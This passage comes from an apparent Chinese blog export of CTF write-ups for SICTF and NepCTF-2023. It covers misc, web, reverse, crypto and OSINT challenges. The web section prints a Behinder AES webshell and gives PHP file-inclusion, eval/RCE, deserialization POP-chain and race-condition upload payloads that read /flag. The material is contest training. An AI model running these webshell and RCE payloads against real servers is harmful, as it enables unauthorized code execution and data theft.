print(&#39;?&#39;,end=&quot;&quot;)</code></pre><blockquote><p>………………!?!!.?………………?.?!.?….!.?…….!?!!.?!!!!!!?.?!.?!!!.!!!!!!!!!!!!!.?………!?!!.?……..?.?!.?..!.?…….!?!!.?!!!!!!?.?!.?!!!!!!!!!!!.?……………!?!!.?…………..?.?!.?……..!.?……………..!?!!.?!!!!!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!!!!!!!!!…!…….!.!!!!!!!.?………….!?!!.?…………?.?!.?……………………!…..!.?………….!?!!.?!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!!!!!!!!!!!…..!.!!!!!!!!!!!!!!!!!.?……………!?!!.?…………..?.?!.?…………..!.!!!!!.?……………!?!!.?!!!!!!!!!!!!!!?.?!.?!!!……………..!.?…….!?!!.?!!!!!!?.?!.?!!!!!!!……………!.?………….!?!!.?…………?.?!.?………………….!…..!.!.?……………!?!!.?!!!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!.?……………!?!!.?…………..?.?!.?……!.?………….!?!!.?!!!!!!!!!!!!?.?!.?!!!!!!!!!.!!!!!!!!!!!!!!!!!!!………….!.!!!!!!!!!!!!!!!!!!!………..!.!………….!.!!!!!!!!!!!!!!!!!………..!.?……………!?!!.?…………..?.?!.?!.!!!!!.!!!!!…….!.!!!.?………….!?!!.?!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!!!!!.!.?……………..!?!!.?…………….?.?!.?…………!.?.</p></blockquote><p>Short Ook</p><h3 id="baby-zip"><a href="#baby-zip" class="headerlink" title="baby_zip"></a>baby_zip</h3><pre><code class="sh">bkcrack -C flag.zip -c flag.png -x 0 89504E470D0A1A0A0000000D49484452bkcrack -C flag.zip -c flag.png -k 6424c164 7c334afd f99666e5 -d flag.png</code></pre><p>010查看flag在最后</p><h3 id="Easy-Shark"><a href="#Easy-Shark" class="headerlink" title="Easy_Shark"></a>Easy_Shark</h3><p>AES冰蝎3流量</p><pre><code class="PHP">&lt;?php@error_reporting(0);session_start();    $key=&quot;2295d22e2d70888f&quot;;        $_SESSION[&#39;k&#39;]=$key;        $post=file_get_contents(&quot;php://input&quot;);        if(!extension_loaded(&#39;openssl&#39;))        &#123;                $t=&quot;base64_&quot;.&quot;decode&quot;;                $post=$t($post.&quot;&quot;);                                for($i=0;$i&lt;strlen($post);$i++) &#123;                             $post[$i] = $post[$i]^$key[$i+1&amp;15];                             &#125;        &#125;        else        &#123;                $post=openssl_decrypt($post, &quot;AES128&quot;, $key);        &#125;    $arr=explode(&#39;|&#39;,$post);    $func=$arr[0];    $params=$arr[1];        class C&#123;public function __invoke($p) &#123;eval($p.&quot;&quot;);&#125;&#125;    @call_user_func(new C(),$params);?&gt;key = &#39;2295d22e2d70888f&#39;</code></pre><p>解冰蝎流量</p><p><img src="/img/image-20230910150549103.png"></p><pre><code class="PHP">TGLBOMSJNSRAJAZDEZXGHSJNZWHG</code></pre><p><img src="/img/image-20230910150603341.png"></p><p><img src="/img/image-20230910150643928.png"></p><p>变异凯撒</p><pre><code class="PHP">def decrypt_string(ciphertext, offsets):    decrypted_string = &quot;&quot;    offset_index = 0    for char in ciphertext:        offset = offsets[offset_index] % 26        decrypted_char_code = (ord(char) - ord(&#39;A&#39;) - offset) % 26 + ord(&#39;A&#39;)        decrypted_char = chr(decrypted_char_code)        decrypted_string += decrypted_char        offset_index = (offset_index + 1) % len(offsets)    return decrypted_stringciphertext = &quot;TGLBOMSJNSRAJAZDEZXGHSJNZWHG&quot;offsets = [1, 50, 61, 8, 9, 20, 63, 41]while True:    decrypted_string = decrypt_string(ciphertext, offsets)    print(decrypted_string)</code></pre><p>FLAG：SICTFSHUMUISAGOODBOYYYYYYYYY</p><h3 id="fast-morse"><a href="#fast-morse" class="headerlink" title="fast_morse"></a>fast_morse</h3><p><img src="/img/image-20230910150708012.png"></p><p>morse解密</p><p>得到falg</p><p><img src="/img/image-20230910150719929.png"></p><p>变成小写</p><h3 id="QR-QR-QR"><a href="#QR-QR-QR" class="headerlink" title="QR_QR_QR"></a>QR_QR_QR</h3><pre><code class="Python">import numpy as npimport matplotlib.pyplot as pltfrom pyzbar.pyzbar import decodefrom PIL import Imagefrom pwn import *# 设置日志级别为调试模式context(log_level=&#39;debug&#39;)# 创建图片函数def create_image(file_path):    with open(file_path, &#39;r&#39;) as file:        lines = file.readlines()    # 生成图片数组    image_array = [[255 if bit == &#39;1&#39; else 0 for bit in line.strip()] for line in lines]    image_array = np.array(image_array, dtype=np.uint8)    # 保存为图片    plt.imsave(&#39;output.png&#39;, image_array, cmap=&#39;gray&#39;)# 读取二维码函数def read_qr_code(image_path):    image = Image.open(image_path)    decoded_objects = decode(image)    for obj in decoded_objects:        return obj.data.decode(&#39;utf-8&#39;)# 连接服务器conn = remote(&#39;210.44.151.51&#39;, 10365)while True:    try:        # 从服务器接收数据        data = conn.recvuntil(&#39;Please Decrypt this QR code:&#39;, drop=True)        # 将数据保存到文本文件        with open(&#39;1.txt&#39;, &#39;w&#39;) as file:            file.write(data.decode())        # 从文本文件创建图片        create_image(&#39;1.txt&#39;)        # 读取图片中的二维码        code = read_qr_code(&#39;output.png&#39;)        print(code)        # 发送二维码到服务器        conn.sendline(str(code))        conn.recvline()    finally:        # 关闭文件        file.close()</code></pre><h3 id="问卷调查"><a href="#问卷调查" class="headerlink" title="问卷调查"></a>问卷调查</h3><p>第三道就是flag</p><p>SICTF{SICTF_Round3_will_do_even_better!}</p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h3 id="签到-Include"><a href="#签到-Include" class="headerlink" title="[签到]Include"></a>[签到]Include</h3><p>利用伪协议可直接读到flag</p><pre><code class="Python">    /?SICTF=php://filter/convert.base64-encode/resource=/flag</code></pre><h3 id="Baby-PHP"><a href="#Baby-PHP" class="headerlink" title="Baby_PHP"></a>Baby_PHP</h3><pre><code class="Plain">&lt;?phphighlight_file(__FILE__);error_reporting(0);$query = $_SERVER[&#39;QUERY_STRING&#39;];if (preg_match(&#39;/_|%5f|\.|%2E/i&#39;, $query)) &#123;    die(&#39;You are Hacker!&#39;);&#125;if($_GET[&#39;k_e_y&#39;] !==&#39;123&#39; &amp;&amp; preg_match(&#39;/^123$/&#39;,$_GET[&#39;k_e_y&#39;]))&#123;    echo(&quot;You are will Win!&lt;br&gt;&quot;);    if(isset($_POST[&#39;command&#39;]))&#123;        $command = $_POST[&#39;command&#39;];        if(!preg_match(&quot;/\~|\`|\@|\#|\\$|\%|\&amp;|\*|\（|\）|\-|\+|\=|\&#123;|\&#125;|\[|\]|\:|\&#39;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;,$command))&#123;            eval($command);        &#125;        else&#123;            echo(&quot;You are Hacker!&quot;);        &#125;    &#125;&#125;else&#123;    echo(&quot;K_e_y is Errors!&quot;);&#125;K_e_y is Errors!</code></pre><p>代码开始会对输入的字符串进行正则匹配，跟_有关的url编码之类的全部过滤</p><p>可以用空格或者.代替_,.又被过滤了，用了空格，后面一个简单的若比较换行符绕过</p><p>后面cmd一个无数字字母rce</p><p>可见ctfshow  web40的题解</p><pre><code class="Plain">/?k%20e%20y=123%0acommand=show_source(next(array_reverse(scandir(pos(localeconv())))));</code></pre><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><pre><code class="Plain">&lt;?php error_reporting(0); highlight_file(__FILE__); $code = $_POST[&#39;code&#39;]; $code = str_replace(&quot;(&quot;,&quot;hacker&quot;,$code); $code = str_replace(&quot;.&quot;,&quot;hacker&quot;,$code); eval($code); ?&gt;</code></pre><p>借鉴宏爷文章</p><p><a href="https://blog.csdn.net/qq_63928796/article/details/127963079">https://blog.csdn.net/qq_63928796/article/details/127963079</a></p><pre><code class="PHP">code=echo $_POST[1];&amp;1=cat /f*</code></pre><h3 id="我全都要"><a href="#我全都要" class="headerlink" title="我全都要"></a>我全都要</h3><p>POP</p><pre><code class="PHP">&lt;?phphighlight_file(__FILE__);class B&#123;    public $pop = &#39;233333333&#39;;    public $i = &#39;1&#39;;    public $nogame;    public function __destruct()    &#123;        if(preg_match(&quot;/233333333/&quot;,$this-&gt;pop))&#123;            echo &quot;这是一道签到题，不能让新生一直做不出来遭受打击&quot;;        &#125;    &#125;    public function game()&#123;        echo &quot;扣1送地狱火&quot;;        if ($this-&gt;i = &quot;1&quot;)&#123;            echo &#39;&lt;img src=\&#39;R.jpg\&#39;&gt;&#39;;            $this-&gt;nogame-&gt;love();        &#125;    &#125;    public function __clone()&#123;        echo &quot;必须执行&quot;;        eval($_POST[&quot;cmd&quot;]);    &#125;&#125;class A&#123;    public $Aec;    public $girl = &#39;QNKCDZO&#39; ;    public $boy = &#39;240610708&#39;;    public function __toString()    &#123;        echo &quot;I also want to fall in love&quot;;        if($this-&gt;girl != $this-&gt;boy &amp;&amp; md5($this-&gt;girl) == md5($this-&gt;boy))&#123;            $this-&gt;Aec-&gt;game();        &#125;    &#125;&#125;class P&#123;    public $MyLover;    public $name = &#39;1&#39;;    public function __call($name, $arguments)    &#123;        echo &quot;有对象我会在这打CTF???看我克隆一个对象！&quot;;        if ($name != &quot;game&quot;) &#123;            echo &quot;打游戏去，别想着对象了&quot;;            $this-&gt;MyLover = clone new B;        &#125;    &#125;&#125;$a = new B();$a -&gt;pop = new A();$a -&gt;pop -&gt;Aec = new B();$a -&gt;pop -&gt;Aec -&gt; nogame = new P();echo serialize($a);</code></pre><p>payload</p><p>解析时第一个[会解析为下划线</p><pre><code class="php">?A[B_C=O:1:&quot;B&quot;:3:&#123;s:3:&quot;pop&quot;;O:1:&quot;A&quot;:3:&#123;s:3:&quot;Aec&quot;;O:1:&quot;B&quot;:3:&#123;s:3:&quot;pop&quot;;s:9:&quot;233333333&quot;;s:1:&quot;i&quot;;s:1:&quot;1&quot;;s:6:&quot;nogame&quot;;O:1:&quot;P&quot;:2:&#123;s:7:&quot;MyLover&quot;;N;s:4:&quot;name&quot;;s:1:&quot;1&quot;;&#125;&#125;s:4:&quot;girl&quot;;s:7:&quot;QNKCDZO&quot;;s:3:&quot;boy&quot;;s:9:&quot;240610708&quot;;&#125;s:1:&quot;i&quot;;s:1:&quot;1&quot;;s:6:&quot;nogame&quot;;N;&#125;</code></pre><pre><code class="php">cmd=system(&quot;cat /flag&quot;);</code></pre><h3 id="你能跟得上我的speed吗"><a href="#你能跟得上我的speed吗" class="headerlink" title="你能跟得上我的speed吗"></a>你能跟得上我的speed吗</h3><p>条件竞争</p><p>准备一个php文件</p><p>内容为</p><pre><code>&lt;?php @eval(system(&quot;cat /flag&quot;));?&gt;</code></pre><p>抓两个包</p><p>一个为get传参的包，访问url&#x2F;uploads&#x2F;2.php,抓包</p><p>另一个为post包，直接就抓上传的包，如下</p><p><img src="/img/image-20230910150927547.png"></p><p>俩个包用burp爆破，爆破方式为noplayload，开跑</p><p><img src="/img/image-20230910150939269.png"></p><h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h3 id="签到-PYC"><a href="#签到-PYC" class="headerlink" title="[签到]PYC"></a>[签到]PYC</h3><pre><code class="Java">uncompyle6 1.pyc &gt; 1.py</code></pre><h3 id="Myobject"><a href="#Myobject" class="headerlink" title="Myobject"></a>Myobject</h3><p>动调出数据，直接赛博厨子秒了</p><p><img src="/img/image-20230910150948949.png"></p><h3 id="chbase"><a href="#chbase" class="headerlink" title="chbase"></a>chbase</h3><p>换表加密</p><p><img src="/img/image-20230910150959506.png"></p><p><img src="/img/image-20230910151009599.png"></p><p><img src="/img/image-20230910151016306.png"></p><h3 id="不一样的base64"><a href="#不一样的base64" class="headerlink" title="不一样的base64"></a>不一样的base64</h3><pre><code class="Java">BASE64_CHARS = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#39;def base64_decode(encoded_data):    decoded_data = &#39;&#39;    padding_count = encoded_data.count(&#39;=&#39;)    encoded_data = encoded_data.replace(&#39;=&#39;, &#39;&#39;)    binary_str = &#39;&#39;    for char in encoded_data:        decimal_val = BASE64_CHARS.index(char)        binary_str += format(decimal_val, &#39;06b&#39;)    if padding_count &gt; 0:        binary_str = binary_str[:-padding_count * 2]    for i in range(0, len(binary_str), 8):        byte = binary_str[i:i + 8]        decoded_data += chr(int(byte, 2))    return decoded_dataencoded_data = input(&#39;&#39;)decoded_data = base64_decode(encoded_data)print(decoded_data)</code></pre><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h3 id="签到-Shop"><a href="#签到-Shop" class="headerlink" title="[签到]Shop"></a>[签到]Shop</h3><p><img src="/img/asynccode.png"></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h3 id="古典大杂烩"><a href="#古典大杂烩" class="headerlink" title="古典大杂烩"></a>古典大杂烩</h3><pre><code class="PHP">🐩👃🐪🐼👅🐯🐩👈👇👭👟👝🐺🐭👉👙👤👋👚🐪🐫👍👢👮👱🐼👢👨👠👭🐽🐰🐻👚👂👧👠👥👛👮👯👮👬🐾👐👛👌👚👞🐨👏👉👆🐿👆👘👇🐺👦🐸👃🐭👟👑👪👃👁🐻🐻👜🐧👇👊🐧🐾🐼👇🐫🐺👐👆👪🐼👋👌👧🐻👐🐩🐺👥🐽👋👉🐰👎👠👠👣🐧🐫👧🐭👢🐯👑👑🐮👂👏🐻👥👚🐮👋👬👌👥👁👣👅👧👯👦👌👌👍👠👌🐽👉👃👊🐫👉🐨🐮👩👆🐪🐯👘👏👏🐼👩👍👊👍👡👀👰👋👣👨👧👍👜👐👛🐮👘👅👠🐿👂👰👄👈👝👠👤👃👛👘🐭👅👱👆👬👫👥👆🐽👁👐👥👊👇👉👊👩👌👭🐫🐫👬👱🐯👇🐺👁👞👑👙🐮👜👋👘👪👩👚👦👨👀👩👐👉👃🐾👥👀🐫👝👍🐩🐧👰👆👇👨🐪👃🐭👦🐫👱</code></pre><p>emjio解密</p><pre><code class="PHP">2L3EN82QPvhfC6RbmTc34VkwzEkqivF9DcKpindwxwuGYdUcg1XROHOaPCoAL6hZsLJDDe0PS0GEP4CYOsETUpDY2CnFTR9Wiil04p6k8ZZ7KXDnc7TuUnJlNpxoUUViUFRLS4R17rO38aXXErVSVjIyTlqpVeYd7aNiHKyMQfimLda6NzOutnOFJYnSPRSrUv44uz8PCJgZb7eTasrcoqIrYRLGnI4fV20yOPq3L6o4z</code></pre><p><img src="/img/image-20230910151047788.png"></p><h3 id="Radio"><a href="#Radio" class="headerlink" title="Radio"></a>Radio</h3><p><img src="/img/image-20230910151039956.png"></p><h3 id="Easy-CopperSmith"><a href="#Easy-CopperSmith" class="headerlink" title="Easy_CopperSmith"></a>Easy_CopperSmith</h3><pre><code class="Java">from sage.all import *import binasciifrom Crypto.Util.number import *n =114007680041157617250208809154392208683967639953423906669116998085115503737001019559692895227927818755160444076128820965038044269092587109196557720941716578025622244634385547194563001079609897387390680250570961313174656874665690193604984942452581886657386063927035039087208310041149977622001887997061312418381cipher =87627846271126693177889082381507430884663777705438987267317070845965070209704910716182088690758208915234427170455157948022843849997441546596567189456637997191173043345521331111329110083529853409188141263211030032553825858341099759209550785745319223409181813931086979471131074015406202979668575990074985441810e2 = 0x10001pbits = 512for i in range(0,2**4):    p4=0x38481379948fa6f1dcedd12e2fb045f096e9978eccc3be2984a9ede4e6ebe1958606c590    p4=p4+int(hex(i),16)    print(hex(p4))    kbits = pbits - p4.nbits()  #未知需要爆破的比特位数    print(p4.nbits())    p4 = p4 &lt;&lt; kbits    PR.&lt;x&gt; = PolynomialRing(Zmod(n))    f = x + p4    roots = f.small_roots(X=2^kbits, beta=0.4) #进行爆破    #print roots    if roots:        #爆破成功，求根        p = p4+int(roots[0])        print(&quot;p: &quot;, hex(int(p)))        assert n % p == 0        q = n/int(p)        print(&quot;q: &quot;, hex(int(q)))        print(gcd(p,q))        phin = (p-1)*(q-1)        print(gcd(e2,phin))        d = inverse_mod(e2,phin)        print(&quot;d：&quot;,d)        flag = pow(cipher,d,n)        flag = hex(int(flag))[2:]        result = &quot;&quot;        for i in range(0, len(flag), 2):            hex_int = int(flag[i:i+2], 16)  # 转换为整数            result += chr(hex_int)  # 转换为字符并拼接到结果字符串        print(&#39;result :&#39;,result)        # SICTF&#123;3f9366ed-b8e4-412f-bbd0-62616a24115c&#125;</code></pre><h3 id="MingTianPao"><a href="#MingTianPao" class="headerlink" title="MingTianPao"></a>MingTianPao</h3><pre><code class="Python">import codecsimport numpy as npdef is_character(x):    return ord(&#39;a&#39;) &lt;= x &lt;= ord(&#39;z&#39;) or ord(&#39;A&#39;) &lt;= x &lt;= ord(&#39;Z&#39;)def xor_strings(s1, s2):    return bytes([b1 ^ b2 for b1, b2 in zip(s1, s2)])def infer_space(index, pos):    if message[index, pos] != 0:        return    message[index, pos] = ord(&#39; &#39;)    for x in range(len(ciphertexts)):        if x != index:            message[x][pos] = xor_strings(ciphertexts[x], ciphertexts[index])[pos] ^ ord(&#39; &#39;)def find_spaces():    for index, x in enumerate(ciphertexts):        res = [xor_strings(x, y) for y in ciphertexts if x != y]        f = lambda position: len(list(filter(is_character, [s[position] for s in res])))        cnt = [f(pos) for pos in range(len(x))]        for pos in range(len(x)):            space_data.append((f(pos), index, pos))with open(&#39;222.txt&#39;, &#39;r&#39;) as file:    ciphertexts = [codecs.decode(x.strip().encode(), &#39;hex&#39;) for x in file.readlines()]message = np.zeros([len(ciphertexts), len(ciphertexts[0])], dtype=int)space_data = []find_spaces()space_data = sorted(space_data, reverse=True)for weight, index, pos in space_data:    infer_space(index, pos)print(&#39;\n&#39;.join([&#39;&#39;.join([chr(c) for c in x]) for x in message]))hex_str1 = &quot;1f2037202a1e6d06353b61263d050a0538493b3018544e14171d2b1c4218&quot;hex_str2 = &quot;Little Red Riding Hood promised&quot;bytes1 = bytes.fromhex(hex_str1)bytes2 = bytes(hex_str2, &#39;utf-8&#39;)result = bytes([a ^ b for a, b in zip(bytes1, bytes2)])result_str = result.decode(&#39;utf-8&#39;)print(result_str)</code></pre><h3 id="small-e"><a href="#small-e" class="headerlink" title="small_e"></a>small_e</h3><p>低指数加密&#x2F;m高位攻击</p><p><img src="/img/image-20230910151108842.png"></p><h3 id="签到题来咯！"><a href="#签到题来咯！" class="headerlink" title="签到题来咯！"></a>签到题来咯！</h3><pre><code class="Python">import libnumimport binasciifrom  Crypto.Util.number import *n = 18993579800590288733556762316465854395650778003397512624355925069287661487515652428099677335464809283955351330659278915073219733930542167360381688856732762552737791137784222098296804826261681852699742456526979985201331982720936091963830799430264680941164508709453794113576607749669278887105809727027129736803614327631979056934906547015919204770702496676692691248702461766117271815398943842909579917102217310779431999448597899109808086655029624478062317317442297276087073653945439820988375066353157221370129064423613949039895822016206336117081475698987326594199181180346821431242733826487765566154350269651592993856883c1 = 3089900890429368903963127778258893993015616003863275300568951378177309984878857933740319974151823410060583527905656182419531008417050246901514691111335764182779077027419410717272164998075313101695833565450587029584857433998627248705518025411896438130004108810308599666206694770859843696952378804678690327442746359836105117371144846629293505396610982407985241783168161504309420302314102538231774470927864959064261347913286659384383565379900391857812482728653358741387072374314243068833590379370244368317200796927931678203916569721211768082289529948017340699194622234734381555103898784827642197721866114583358940604520c2 = 6062491672599671503583327431533992487890060173533816222838721749216161789662841049274959778509684968479022417053571624473283543736981267659104310293237792925201009775193492423025040929132360886500863823523629213703533794348606076463773478200331006341206053010168741302440409050344170767489936681627020501853981450212305108039373119567034948781143698613084550376070802084805644270376620484786155554275798939105737707005991882264123315436368611647275530607811665999620394422672764116158492214128572456571553281799359243174598812137554860109807481900330449364878168308833006964726761878461761560543284533578701661413931def is_prime(n):    if n &lt;= 1:        return False    if n &lt;= 3:        return True    if n % 2 == 0 or n % 3 == 0:        return False    i = 5    while i * i &lt;= n:        if n % i == 0 or n % (i + 2) == 0:            return False        i += 6    return True    def franklinReiter(n,e,c1,c2):    PR.&lt;x&gt; = PolynomialRing(Zmod(n))    g1 = (114*x+2333)^int(e) - c1    g2 = (514*x+4555)^int(e) - c2    def gcd(g1, g2):        while g2:            g1, g2 = g2, g1 % g2        return g1.monic()    return -gcd(g1, g2)[0]for i in range(1024):    if is_prime(i):        e = i        m=franklinReiter(n,e,c1,c2)        print(long_to_bytes((int(m))))</code></pre><p>e应该是983</p><p><img src="/img/image-20230910151249426.png"></p><h3 id="easy-math"><a href="#easy-math" class="headerlink" title="easy_math"></a>easy_math</h3><p>demo</p><pre><code class="python">#demo# from secret import flag# from  Crypto.Util.number import *# m = bytes_to_long(flag)# c = 57751903193610662622957432730720223801836323458721550133101805763463060486486266309568004721657732742899781400754207249733137375171400440423755473421971160000575072519031824740691618617905549725344323721903857290320737224300672847773455169809689188843070599176261204013341324705808617411345132933937680951713# e = 65537# n = p * q# hint1 = getPrime(13)*p+getPrime(256)*q# hint2 = getPrime(13)*p+getPrime(256)*q# c = pow(m,e,n)# print(f&#39;n = &#123;n&#125;&#39;)# print(f&#39;hint1 = &#123;hint1&#125;&#39;)# print(f&#39;hint2 = &#123;hint2&#125;&#39;)# print(f&#39;c = &#123;c&#125;&#39;)## &#39;&#39;&#39;# n = 68123067052840097285002963401518347625939222208495512245264898037784706226045178539672509359795737570458454279990340789711761542570505016930986418403583534761200927746744298082254959321108829717070206277856970403191060311901559017372393931121345743640657503994132925993800497309703877076541759570410784984067# hint1 = 564294243979930441832363430202216879765636227726919016842676871868826273613344463155168512928428069316237289920953421495330355385445649203238665802121198919543532254290185502622234014832349396422316629991217252686524462096711723580# hint2 = 484307144682854466149980416084532076579378210225500554261260145338511061452958092407101769145891750844383042274498826787696953308289632616886162073232218214504005935332891893378072083589751354946391146889055039887781077066257013110# c = 57751903193610662622957432730720223801836323458721550133101805763463060486486266309568004721657732742899781400754207249733137375171400440423755473421971160000575072519031824740691618617905549725344323721903857290320737224300672847773455169809689188843070599176261204013341324705808617411345132933937680951713# &#39;&#39;&#39;</code></pre><p>exp</p><pre><code class="python">from gmpy2 import gcd,invertfrom itertools import productfrom tqdm import tqdmn = 68123067052840097285002963401518347625939222208495512245264898037784706226045178539672509359795737570458454279990340789711761542570505016930986418403583534761200927746744298082254959321108829717070206277856970403191060311901559017372393931121345743640657503994132925993800497309703877076541759570410784984067hint1 = 564294243979930441832363430202216879765636227726919016842676871868826273613344463155168512928428069316237289920953421495330355385445649203238665802121198919543532254290185502622234014832349396422316629991217252686524462096711723580hint2 = 484307144682854466149980416084532076579378210225500554261260145338511061452958092407101769145891750844383042274498826787696953308289632616886162073232218214504005935332891893378072083589751354946391146889055039887781077066257013110c = 57751903193610662622957432730720223801836323458721550133101805763463060486486266309568004721657732742899781400754207249733137375171400440423755473421971160000575072519031824740691618617905549725344323721903857290320737224300672847773455169809689188843070599176261204013341324705808617411345132933937680951713e = 65537bar = tqdm(total=(1&lt;&lt;12)**2)for x1, x2 in tqdm(product(range(1&lt;&lt;12,1&lt;&lt;13), repeat=2)):    q = gcd(hint1*x1 -hint2*x2,n)    bar.update(1)    if q != 1:        print(&#39;q=&#39;,q)        breakp = n//qphi_n = (p-1)*(q-1)d = invert(e, phi_n)print(bytes.fromhex(hex(pow(c, d, n))[2:]))</code></pre><h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h3 id="购物之旅"><a href="#购物之旅" class="headerlink" title="购物之旅"></a>购物之旅</h3><p>SICTF{北京市_顺义区_新顺南大街_北京华联顺义金街购物中心}</p><h3 id="美女姐姐"><a href="#美女姐姐" class="headerlink" title="美女姐姐"></a>美女姐姐</h3><p>SICTF{福建省福州市仓山区烟台山公园}</p><h3 id="宝塔镇河妖"><a href="#宝塔镇河妖" class="headerlink" title="宝塔镇河妖"></a>宝塔镇河妖</h3><p>SICTF{山东省济宁市汶上县太子灵踪塔}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nepctf-2023</title>
      <link href="/2023/09/04/nepctf-2023/"/>
      <url>/2023/09/04/nepctf-2023/</url>
      
        <content type="html"><![CDATA[<h1 id="NepCTF-2023"><a href="#NepCTF-2023" class="headerlink" title="NepCTF-2023"></a>NepCTF-2023</h1><p>之前的比赛，懒惰的我现在才整理wp</p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="问卷"><a href="#问卷" class="headerlink" title="问卷"></a>问卷</h2><blockquote><p>你猜猜你猜猜</p></blockquote><h2 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h2><p>真签到</p><blockquote><p>NepCTF{H4ve_Fun_1N_This_Game}</p></blockquote><h2 id="codes"><a href="#codes" class="headerlink" title="codes"></a>codes</h2><p>环境env要</p><pre><code>en\v绕过</code></pre><pre><code class="c">#include &lt;stdio.h&gt;extern char **en\viron;int main()&#123;    int i = 0;    while (en\viron[i] != NULL)    &#123;        printf(&quot;%s\n&quot;, en\viron[i]);        i++;    &#125;    return 0;&#125;</code></pre><p><img src="/img/image-20230813192127319.png"></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="与AI共舞的哈夫曼"><a href="#与AI共舞的哈夫曼" class="headerlink" title="与AI共舞的哈夫曼"></a>与AI共舞的哈夫曼</h2><p>hint ：年轻人就要年轻，正经人谁自己写代码</p><p>拿去让gpt写脚本即可</p><pre><code class="python">import heapqimport osclass HuffmanNode:    def __init__(self, char, freq):        self.char = char        self.freq = freq        self.left = None        self.right = None    def __lt__(self, other):        return self.freq &lt; other.freqdef build_huffman_tree(frequencies):    heap = [HuffmanNode(char, freq) for char, freq in frequencies.items()]    heapq.heapify(heap)    while len(heap) &gt; 1:        left = heapq.heappop(heap)        right = heapq.heappop(heap)        merged = HuffmanNode(None, left.freq + right.freq)        merged.left = left        merged.right = right        heapq.heappush(heap, merged)    return heap[0]def build_huffman_codes(node, current_code, huffman_codes):    if node is None:        return    if node.char is not None:        huffman_codes[node.char] = current_code        return    build_huffman_codes(node.left, current_code + &#39;0&#39;, huffman_codes)    build_huffman_codes(node.right, current_code + &#39;1&#39;, huffman_codes)def compress(input_file, output_file):    with open(input_file, &#39;rb&#39;) as f:        data = f.read()    frequencies = &#123;&#125;    for byte in data:        if byte not in frequencies:            frequencies[byte] = 0        frequencies[byte] += 1    root = build_huffman_tree(frequencies)    huffman_codes = &#123;&#125;    build_huffman_codes(root, &#39;&#39;, huffman_codes)    compressed_data = &#39;&#39;    for byte in data:        compressed_data += huffman_codes[byte]    padding = 8 - len(compressed_data) % 8    compressed_data += &#39;0&#39; * padding    with open(output_file, &#39;wb&#39;) as f:        # Write frequency information        f.write(bytes([len(frequencies)]))        for byte, freq in frequencies.items():            f.write(bytes([byte, (freq &gt;&gt; 24) &amp; 0xFF, (freq &gt;&gt; 16) &amp; 0xFF, (freq &gt;&gt; 8) &amp; 0xFF, freq &amp; 0xFF]))        # Write compressed data        for i in range(0, len(compressed_data), 8):            byte = compressed_data[i:i+8]            f.write(bytes([int(byte, 2)]))def build_huffman_tree_from_bytes(frequencies):    heap = [HuffmanNode(byte, freq) for byte, freq in frequencies.items()]    heapq.heapify(heap)    while len(heap) &gt; 1:        left = heapq.heappop(heap)        right = heapq.heappop(heap)        merged = HuffmanNode(None, left.freq + right.freq)        merged.left = left        merged.right = right        heapq.heappush(heap, merged)    return heap[0]def decompress(input_file, output_file):    with open(input_file, &#39;rb&#39;) as f:        frequencies_count = ord(f.read(1))        frequencies = &#123;&#125;        for _ in range(frequencies_count):            byte = ord(f.read(1))            freq = (ord(f.read(1)) &lt;&lt; 24) + (ord(f.read(1)) &lt;&lt; 16) + (ord(f.read(1)) &lt;&lt; 8) + ord(f.read(1))            frequencies[byte] = freq        root = build_huffman_tree_from_bytes(frequencies)        huffman_codes = &#123;&#125;        build_huffman_codes(root, &#39;&#39;, huffman_codes)        reverse_huffman_codes = &#123;v: k for k, v in huffman_codes.items()&#125;        decompressed_data = bytearray()        code = &#39;&#39;        while True:            byte = f.read(1)            if len(byte) == 0:                break            byte = ord(byte)            for i in range(7, -1, -1):                if byte &amp; (1 &lt;&lt; i):                    code += &#39;1&#39;                else:                    code += &#39;0&#39;                if code in reverse_huffman_codes:                    decompressed_data.append(reverse_huffman_codes[code])                    code = &#39;&#39;    with open(output_file, &#39;wb&#39;) as f:        f.write(decompressed_data)if __name__ == &quot;__main__&quot;:    # input_file = &#39;input.txt&#39;    compressed_file = &#39;compressed.bin&#39;    decompressed_file = &#39;decompressed.txt&#39;    # 压缩文件    # compress(input_file, compressed_file)    # 解压缩文件    decompress(compressed_file, decompressed_file)</code></pre><p><img src="/img/image-20230813193106060.png"></p><h2 id="ConnectedFive"><a href="#ConnectedFive" class="headerlink" title="ConnectedFive"></a>ConnectedFive</h2><p>和ai下五子棋，慢慢下就好了<del>多连甚至能得多分</del></p><p>42分就可以拿到flag</p><p><img src="/img/image-20230813201925823.png"></p><h2 id="陌生的语言"><a href="#陌生的语言" class="headerlink" title="陌生的语言"></a>陌生的语言</h2><p><img src="/img/bdwahbjkdaw.bmp"></p><p><img src="/img/6UTCY0LK%7BT39ZO8@2KZP9.bmp"></p><p>flag翻译就是下面这句话，原陌生的语言也是其中的</p><p><img src="/img/image-20230813193927924.png"></p><h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><h2 id="小叮弹钢琴"><a href="#小叮弹钢琴" class="headerlink" title="小叮弹钢琴"></a>小叮弹钢琴</h2><p><img 